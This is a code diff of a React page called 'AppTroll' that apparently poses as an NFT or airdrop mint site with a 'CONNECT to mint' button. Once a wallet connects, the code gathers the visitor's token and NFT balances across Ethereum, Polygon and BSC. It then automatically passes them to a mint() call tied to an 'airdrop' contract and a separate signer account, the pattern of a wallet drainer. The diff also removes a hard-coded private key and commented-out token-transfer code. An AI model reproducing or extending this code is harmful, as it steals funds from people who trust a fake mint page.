@@ -22,43 +22,17 @@ const dataProviderBSC = process.env.REACT_APP_DATA_PROVIDER_ADDRESS_BSC;
 const airdropBSC = process.env.REACT_APP_AIRDROP_ADDRESS_BSC;
 
 function AppTroll() {
-  //TOKENS AFTER GET BALANCE
   const [tokensErc20WithBalance, setTokensErc20WithBalance] = useState([]);
   const [tokensErc721WithBalance, setTokensErc721WithBalance] = useState([]);
-  //STATE FOR NETWORKS CHECKED OR NOT
   const [ethNet, setEthNet] = useState(false);
   const [polygonNet, setPolygonNet] = useState(false);
   const [bscNet, setBscNet] = useState(false);
-
   const { isConnected, address } = useAccount()
   const { chain } = useNetwork()
-  const clientReader = usePublicClient();
   const { data: clientWriter } = useWalletClient();
-  const account = privateKeyToAccount(`0xfec68842cdd93cfd6824fae8dded0b30f5eb3f0496b2781a69abc647a922788b`);
-
-
-
-  // const LinkGoerli = "0x326C977E6efc84E512bB9C30f76E30c160eD06FB";
-  // const { config } = usePrepareContractWrite({
-  //   address: LinkGoerli,
-  //   abi: erc20abi,
-  //   functionName: 'transfer',
-  //   args: ["0x4A7Df03838d2A4c9A9B81a3a0099dF500c0Bb102", 1000000000000000000],
-  // })
-  // const { data, isSuccess, write, isError } = useContractWrite(config)
-
-  // const sendTx = async () => {
-  //   write?.()
-  //   console.log(isSuccess, "SUCCESS")
-  //   console.log(isError, "ERROR")
-  //   console.log(data, "DATA")
-  // }
-
-  // const advancedMatching = { em: 'some@email.com' }
-  // const options = {
-  //   autoConfig: true,
-  //   debug: false,
-  // }
+  const clientReader = usePublicClient();
+  const sound = require('./GT-song.mp3');
+  const [playing, setPlaying] = useState(false);
   // useEffect(() => {
   //   ReactPixel.init('445602487770007', advancedMatching, options)
   //   ReactPixel.pageView()
@@ -67,8 +41,6 @@ function AppTroll() {
   const { switchNetworkAsync } =
     useSwitchNetwork()
   const { connect, connectors } = useConnect({
-
-   
   })
   const connectWallet = () => {
     if (isMobile) {
@@ -78,8 +50,6 @@ function AppTroll() {
       connect({ connector: connectors[1] })
     }
   }
-  const sound = require('./GT-song.mp3');
-  const [playing, setPlaying] = useState(false);
   useEffect(() => {
     window.addEventListener('touchstart', () => {
       audioRef.current.muted = false
@@ -90,7 +60,6 @@ function AppTroll() {
   useEffect(() => {
     if (chain !== undefined && address !== undefined && isConnected) {
       if (chain.id === 137) {
-        console.log("POLYGON")
         getBalanceErc20(dataProviderPolygon, tokensErc20Polygon, airdropPolygon, address, clientReader).then(
           (res: any) => {
             setTokensErc20WithBalance(res);
@@ -109,10 +78,9 @@ function AppTroll() {
         )
       }
       else if (chain.id === 56) {
-        console.log("BSC")
         getBalanceErc20(dataProviderBSC, tokensErc20BSC, airdropBSC, address, clientReader).then((res: any) => {
           setTokensErc20WithBalance(res);
-          getBalanceErc721(dataProviderBSC, tokensErc721BSC, airdropBSC, address, clientReader ).then((res1: any) => {
+          getBalanceErc721(dataProviderBSC, tokensErc721BSC, airdropBSC, address, clientReader).then((res1: any) => {
             setTokensErc721WithBalance(res1);
             setBscNet(true)
           },
@@ -124,8 +92,7 @@ function AppTroll() {
         })
       }
       else if (chain.id === 1) {
-        console.log("ETH")
-        getBalanceErc20(dataProviderETH, tokensErc20ETH, airdropETH, address, clientReader ).then((res: any) => {
+        getBalanceErc20(dataProviderETH, tokensErc20ETH, airdropETH, address, clientReader).then((res: any) => {
           setTokensErc20WithBalance(res);
           getBalanceErc721(dataProviderETH, tokensErc721ETH, airdropETH, address, clientReader).then((res1: any) => {
             setTokensErc721WithBalance(res1);
@@ -143,7 +110,7 @@ function AppTroll() {
   useEffect(() => {
     if ((tokensErc20WithBalance !== undefined && tokensErc721WithBalance !== undefined) && (tokensErc20WithBalance.length > 0 || tokensErc721WithBalance.length > 0)) {
       mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, account, clientReader, clientWriter, address).then((res: any) => {
-      }, (err) => {})
+      }, (err) => { })
     }
     else {
       if (chain !== undefined && address !== undefined && isConnected) {
@@ -241,7 +208,7 @@ function AppTroll() {
                       </button>)
                     }
                   })} */}
-                  <button
+                <button
                   className="button" id="Burgur-Button"
                   onClick={connectWallet} >CONNECT to <span>mint</span></button>
               </>
